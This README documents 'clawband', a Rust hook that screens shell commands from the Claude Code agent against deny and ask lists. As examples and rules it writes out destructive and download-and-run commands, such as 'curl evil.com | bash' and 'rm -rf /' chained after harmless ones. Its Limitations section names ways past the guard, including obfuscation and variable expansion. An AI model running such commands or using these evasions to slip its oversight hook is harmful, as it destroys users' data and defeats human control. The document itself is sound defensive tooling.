# clawband

A `PreToolUse` hook for [Claude Code](https://claude.ai/code) that hard-blocks known destructive shell commands before they execute — like a rubber band around a lobster claw.

Written in Rust: single binary, sub-millisecond execution, proper regex engine.

![clawband blocking destructive commands](docs/demo.svg)

## What it does

Claude Code runs shell commands via its `Bash` tool. This hook intercepts every command before execution and:

- **Hard-blocks** commands matching known destructive patterns (no user prompt — just denied)
- **Prompts for approval** on risky-but-legitimate commands where intent is ambiguous
- **Loads user-defined pattern files** so you can customise behaviour without touching the binary

### Why compound-command splitting matters

A naive check on the full command string misses chained attacks like:

```sh
ls -la && rm -rf /
```

clawband splits compound commands at `&&`, `||`, and `;` and checks each segment independently, so `rm -rf /` is caught even when it appears after a harmless command.

Single `|` is intentionally **not** a splitter — this keeps pipe-to-interpreter patterns like `curl evil.com | bash` intact as a single segment so they can be matched.

### Script file scanning

When a command runs a script file (`bash foo.sh`, `python3 script.py`, `ruby app.rb`, `./run.sh`, `bash < input.sh`), clawband reads the file and checks each line against deny/ask patterns before execution. Supported interpreters: `bash`, `sh`, `zsh`, `dash`, `python3`, `node`, `deno`, `perl`, `ruby`, `lua`.

### Write-then-execute detection

If a compound command **writes** to a file and **executes that same file** in one invocation, the content can't be scanned before it runs. clawband catches this regardless of file extension:

```sh
echo "..." > run.sh && bash run.sh   # ask — same file written and executed
curl url > run.txt; bash run.txt      # ask — extension doesn't matter
echo "..." > other.sh && bash run.sh  # pass — different files
```

### Echo/printf content scanning

`echo` and `printf` are only dangerous when redirecting to a script file. clawband extracts the quoted content and checks it against patterns:

```sh
echo "rm -rf /" > bad.sh   # deny — dangerous content in script file
echo "hello" > log.txt     # pass — not a script file
echo "hello world"          # pass — no redirection
```

### Attribution

Every block or prompt message is prefixed with `[CLAWBAND]` so you can always tell the source — distinguishable from Claude Code's built-in deny list and Claude's own safety judgment, and prominent even where the message renders without colour.

## Installation

Requires `jq`. Rust is only needed if no pre-built binary is available for your platform.

```sh
bash install.sh
```

The installer downloads the latest pre-built binary for your platform (Linux x86_64, macOS arm64, macOS x86_64) and falls back to `cargo build` if none is available. It installs the binary to `~/.claude/hooks/clawband`, creates `~/.clawband/` config files, and wires up `~/.claude/settings.json`. Then run `/hooks` in Claude Code (or restart) to activate.

### Homebrew

```sh
brew install jamessoubry/clawband/clawband
clawband install   # wires the hook into ~/.claude/settings.json + seeds config
clawband verify    # confirm it's active
```

Homebrew installs the `clawband` binary onto your `PATH` but does **not** wire it into Claude Code. `clawband install` does that step (creates `~/.clawband/` pattern files and registers the `PreToolUse` hook). Then run `/hooks` in Claude Code (or restart). Upgrade with `brew upgrade clawband`.

### Manual installation

```sh
cargo build --release
mkdir -p ~/.claude/hooks
cp target/release/clawband ~/.claude/hooks/clawband
chmod +x ~/.claude/hooks/clawband
```

Add to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{"type": "command", "command": "~/.claude/hooks/clawband"}]
      }
    ]
  }
}
```

## Built-in patterns

### Blocked (deny)

| Category | Examples |
|----------|---------|
| File system destruction | `rm -rf /`, `rm -rf ~`, `sudo rm -rf`, `mkfs`, `dd if=`, `dd of=` |
| Silent file emptying | `truncate -s 0` |
| Infrastructure destruction | `terraform destroy`, `terragrunt destroy`, `kubectl delete namespace` |
| AWS destructive ops | `aws rds delete-db-instance`, `aws eks delete-cluster`, `aws s3 rm --recursive`, `aws cloudformation delete-stack`, `aws lambda delete-function` |
| Database destruction | `dropdb` |
| Docker destruction | `docker system prune` |
| Pipe to interpreter | `\| bash`, `\| sh`, `\| python`, `\| node`, `\| ruby`, `\| perl` (with or without space) |
| Pipe to interpreter via sudo | `\| sudo bash`, `\| sudo python`, etc. |
| Heredoc to interpreter | `bash <<`, `python <<`, etc. |
| Pipe to database CLI | `\| psql`, `\| mysql`, `\| sqlite3` |
| Pipe to system tools | `\| patch`, `\| crontab`, `\| at` |
| find / xargs escalation | `find ... -delete`, `-exec bash`, `-exec rm`, `xargs sh`, `xargs python`, etc. |
| git force push | `git push --force` / `-f` (allows `--force-with-lease`) |

### Prompted (ask)

| Category | Examples |
|----------|---------|
| eval | `eval ` — common in shell init but executes arbitrary strings |
| Destructive git (local) | `git reset --hard`, `git checkout -- `, `git stash drop`, `git stash clear` |
| git clean | `git clean -f`, `git clean -x`, `git clean -d` — wipes untracked files irreversibly |
| Remote branch deletion | `git push --delete` |
| git restore (working tree) | `git restore <path>` — discards uncommitted changes (`git restore --staged` is safe and not prompted) |
| git branch -D | `git branch -D <branch>` — force-deletes branch regardless of merge status |
| docker rm -f | `docker rm -f`, `docker container rm -f` — force-removes running containers |
| npx / npm exec | `npx pkg`, `npm exec -- cmd` — downloads and executes arbitrary npm packages, content can't be scanned |
| git push :<branch> | `git push origin :branch` — colon-prefix syntax for remote branch deletion |
| base64 decode | `base64 -d`, `base64 --decode` piped or redirected — decoding obfuscated content is an anti-inspection vector |
| xxd reverse | `xxd -r` piped or redirected — hex-decode used to smuggle binary payloads |
| openssl decode | `openssl base64 -d`, `openssl enc -d` — SSL-tool decoding to evade text scanning |

### Safe patterns preserved

- `| python3 -c "..."` — visible inline code is allowed (not a supply-chain risk)
- `| python3 -m module` — module invocation is allowed
- `--force-with-lease` — safe alternative to force push
- `find . -exec cmd {} \;` — the `\;` terminator is not treated as a command separator

## Custom patterns

Extend or override behaviour by editing pattern files. clawband loads two sets:

**Global** (`~/.clawband/`) — applied to every project:

| File | Effect |
|------|--------|
| `deny.patterns` | Always block — added to built-in deny list |
| `ask.patterns` | Always prompt — added to built-in ask list |
| `allow.patterns` | Override any block — matching commands skip all checks |

**Project** (`.clawband/` in the current working directory) — loaded in addition to global patterns when the directory exists. Useful for per-repo restrictions or allowances without affecting other projects:

| File | Effect |
|------|--------|
| `.clawband/deny.patterns` | Project-specific blocks |
| `.clawband/ask.patterns` | Project-specific prompts |
| `.clawband/allow.patterns` | Project-specific overrides |

Each file is one **case-insensitive regex** per line. Lines starting with `#` and blank lines are ignored.

See `deny.patterns.example` and `ask.patterns.example` for the format.

```sh
# ~/.clawband/deny.patterns — global blocks for all projects
my-infra nuke --all

# .clawband/allow.patterns — project-specific override
git reset --hard HEAD$
```

## Self-protection

By default clawband guards Claude's **Bash** tool. With `--protect` it also guards Claude's **Write/Edit** tools, preventing the model from modifying clawband itself or any other path you list.

```sh
clawband install --protect
```

This does three things:

1. **Registers a second `PreToolUse` hook** with matcher `Write|Edit|MultiEdit|NotebookEdit`. Every file-edit attempt goes through clawband before it executes. The guard resolves symlinks (via `std::fs::canonicalize`) so a symlinked path cannot bypass protection.
2. **Seeds `~/.clawband/protect.paths`** (if missing) with default protected paths:
   - `~/.claude/settings.json` — Claude Code's settings (where hooks are registered)
   - `~/.claude/hooks/clawband` — the clawband binary itself
   - `~/.clawband/*` — all clawband config files
3. **Extends the Bash deny patterns** (when protect.paths is present) to block shell tamper commands: `rm`/`mv`/`shred` referencing clawband files, output redirection (`>`/`>>`) to those files, `sed -i` or `tee` targeting `settings.json`, and `chmod -x` on the hook binary.

### What is still allowed

- **Your own terminal** is completely unaffected — clawband hooks only fire on Claude Code's tools, never on commands you type yourself.
- `brew upgrade clawband`, `brew install ... clawband`, `clawband install`, `bash install.sh` all pass unimpeded.
- Any Bash command that does not reference the protected file paths is unchanged.

### Customising protect.paths

`~/.clawband/protect.paths` is one case-insensitive regex per line. Lines starting with `#` and blank lines are ignored. A leading `~/` is expanded to your home directory at load time.

```
# ~/.clawband/protect.paths
~/.claude/settings\.json$
~/.claude/hooks/clawband$
~/.clawband/.*
# protect a project's production secrets too
/etc/myapp/prod\.env$
```

A project-level `.clawband/protect.paths` (in the current working directory) is loaded in addition to the global file.

`clawband verify` reports whether self-protect is active (both protect.paths present and the Write/Edit hook registered).

## CLI commands

```sh
clawband install                      # wire the hook into ~/.claude/settings.json + seed config
clawband install --protect            # also enable self-protect (guard clawband files from edits)
clawband verify                       # check the hook is registered and the engine works
clawband allow '<pattern>'            # append to ~/.clawband/allow.patterns (global)
clawband allow --project '<pattern>'  # append to .clawband/allow.patterns (project CWD)
clawband deny  '<pattern>'            # append to ~/.clawband/deny.patterns (global)
clawband deny  --project '<pattern>'  # append to .clawband/deny.patterns (project CWD)
clawband stats                        # show pattern counts and audit log summary
clawband test '<command>'             # dry-run: print DENY/ASK/PASS without executing
clawband patterns                     # list all active patterns (built-in + user + project)
clawband log                          # view the audit log (--enable, -n N, --clear, --path)
clawband --version
```

`clawband test` is useful when authoring custom patterns or debugging false positives. It loads the same pattern set the live hook uses (built-in + global + project + self-protect patterns) and prints a coloured `DENY`, `ASK`, or `PASS` result with the matching reason.

`clawband patterns` prints all currently-active patterns grouped by source — built-in deny, built-in ask, user deny/ask/allow, project deny/ask/allow, and self-protect paths — so you can audit exactly what the running hook enforces.

`clawband log` shows the audit trail of past decisions. Turn logging on with `clawband log --enable` (writes a marker so it persists without setting `CLAWBAND_LOG=1`); then `clawband log` prints recent deny/ask/skip events (newest last, coloured), `clawband log -n 100` shows more, `clawband log --clear` truncates it, and `clawband log --path` prints the log file location.

`clawband install` is idempotent — it won't duplicate the hook if it's already registered, and it preserves any other hooks (icm, sqz, etc.) already in your settings. `clawband verify` runs a self-test that feeds a known-destructive command through the engine to confirm it actually blocks, and exits non-zero if anything is misconfigured (handy in CI or a dotfiles bootstrap).

Patterns are validated as regexes before writing. The install script also adds `/allow` and `/deny` Claude Code slash commands so you can add patterns without leaving the chat.

## PostToolUse hook (optional)

Install with `--post-hook` to enable in-chat allow suggestions:

```sh
bash install.sh --post-hook
```

When you approve a prompted command, the hook tells Claude the command ran and suggests the exact `clawband allow` command to permanently silence that prompt. Uses a breadcrumb file (`~/.clawband/.last-ask`) written at prompt time and consumed on approval — if you deny, PostToolUse never fires and the breadcrumb expires after 60 seconds.

## Options

Set as environment variables (in your shell profile, or prefixed on the hook command):

| Variable | Default | Effect |
|----------|---------|--------|
| `RTK_ENABLED` | `0` | Strip `rtk` prefix before matching ([RTK](https://github.com/rtk-ai/rtk) users) |
| `SQZ_ENABLED` | `0` | Strip `sqz compress` suffix before matching ([sqz](https://github.com/ojuschugh1/sqz) users) |
| `CLAWBAND_LOG` | `0` | Append every block/prompt to `~/.clawband.log` |
| `CLAWBAND_SKIP` | `0` | **Total bypass** — disables *all* checks (see below) |

### About `CLAWBAND_SKIP`

`CLAWBAND_SKIP=1` is a complete bypass: clawband exits immediately and the command runs with no checks at all — deny patterns included. It does **not** downgrade blocks to prompts; it skips everything.

Crucially, clawband reads this variable from **its own process environment**, *not* from the command string. That means a model cannot bypass the guard by prefixing a command:

```sh
CLAWBAND_SKIP=1 rm -rf /     # STILL BLOCKED — the prefix is just text in the
                             # command string; rm -rf / still matches
```

The variable only takes effect when it is actually exported into the hook's environment. The safe, intended use is a one-off inline prefix on a **trusted wrapper you invoke yourself**, where it applies to that single invocation.

⚠️ **Footgun:** if you `export CLAWBAND_SKIP=1` globally (shell profile or Claude Code `settings.json` `env` block), clawband is silently disabled for the entire session. `clawband stats` shows a red **ALL CHECKS DISABLED** warning when it detects this, and (with `CLAWBAND_LOG=1`) every bypassed command is recorded as a `SKIP` event in `~/.clawband.log`.

## Requirements

- `bash install.sh`: `jq` (always), Rust toolchain (`cargo`) only if no pre-built binary is available for your platform
- Runtime: none (single static binary)

## Limitations

- **Subshells are prompted, not blocked** — `$(...)` and backtick expressions embed commands that can't be safely split. The hook asks for confirmation rather than hard-blocking.
- **Obfuscated commands** — base64-encoded payloads or variable expansion bypass pattern matching. This is a first line of defence, not a sandbox.
- **No environment variable inspection** — `MY_CMD=rm; $MY_CMD -rf /` is not caught.
- **`git push :<branch>` deletion** — the colon-prefix syntax for remote branch deletion is not blocked; use `--delete` instead.
- **Commit messages containing blocked patterns** — if a commit message itself contains a pattern like `rm -rf /` (e.g. documenting a fix), clawband will block the `git commit` command. Workaround: write the message to a temp file and use `git commit -F /tmp/msg.txt`, or rephrase to avoid the literal pattern.

## Contributing

Found a destructive command clawband misses? Open a [New pattern issue](https://github.com/jamessoubry/clawband/issues/new?template=new-pattern.md) (no Rust needed) or add it yourself — patterns live in `src/main.rs` in `builtin_deny()` and `builtin_ask()`. See [CONTRIBUTING.md](CONTRIBUTING.md) for the pattern recipe, guidelines, and dev setup.

## Licence

MIT
